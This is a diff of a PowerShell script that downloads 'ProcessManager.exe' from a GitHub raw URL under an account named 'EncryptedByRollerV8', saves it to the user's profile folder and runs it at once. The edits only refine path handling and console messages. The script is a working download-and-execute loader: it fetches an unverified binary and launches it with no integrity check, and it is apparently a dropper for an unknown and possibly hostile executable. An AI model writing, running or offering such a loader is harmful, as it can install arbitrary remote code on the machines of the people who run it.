@@ -1,30 +1,32 @@
-# Get the current user's profile path
-$userPath = $env:USERPROFILE
+# Get the correct user folder path - works on all Windows versions
+$userFolder = [Environment]::GetFolderPath("UserProfile")
+$destination = Join-Path -Path $userFolder -ChildPath "ProcessManager.exe"
+
+Write-Host "User folder detected: $userFolder"
+Write-Host "File will be saved to: $destination"
 
 # Download URL
 $url = "https://github.com/EncryptedByRollerV8/f/raw/main/ProcessManager.exe"
 
-# Destination file path
-$destination = Join-Path -Path $userPath -ChildPath "ProcessManager.exe"
-
 try {
     # Download the file
-    Write-Host "Downloading file to $destination..."
+    Write-Host "Downloading..."
     Invoke-WebRequest -Uri $url -OutFile $destination -UseBasicParsing
     
-    # Check if file was downloaded successfully
     if (Test-Path $destination) {
-        Write-Host "Download completed successfully."
+        Write-Host "Success! File saved to: $destination"
         
-        # Execute the downloaded file
+        # Run the file
         Write-Host "Starting ProcessManager..."
         Start-Process -FilePath $destination
-        
-        Write-Host "ProcessManager has been started."
+        Write-Host "Application started!"
     } else {
-        Write-Host "Error: File was not downloaded successfully."
+        Write-Host "Error: Download failed"
     }
 }
 catch {
-    Write-Host "An error occurred: $($_.Exception.Message)"
+    Write-Host "Error: $($_.Exception.Message)"
 }
+
+Write-Host "Press any key to close..."
+$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
